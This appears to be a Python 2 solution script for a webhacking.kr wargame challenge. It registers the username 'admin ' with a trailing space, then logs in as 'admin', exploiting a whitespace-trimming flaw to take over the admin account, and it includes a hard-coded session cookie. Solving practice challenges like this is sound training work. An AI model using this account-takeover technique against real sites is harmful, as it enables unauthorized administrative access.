#-*- coding: utf-8 -*-
import urllib
import urllib2
import CookieManager


challengeUrl = "http://webhacking.kr/challenge/web/web-05/mem/join.php"
CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")

parameters = urllib.urlencode({
    "id": "admin ",
    "pw": "1q2w3e"
})

httpRequest = urllib2.Request(challengeUrl, data=parameters)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: 'POST'

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

challengeUrl = "http://webhacking.kr/challenge/web/web-05/mem/login.php"

parameters = urllib.urlencode({
    "id": "admin",
    "pw": "1q2w3e"
})

httpRequest = urllib2.Request(challengeUrl, data=parameters)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: 'POST'

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
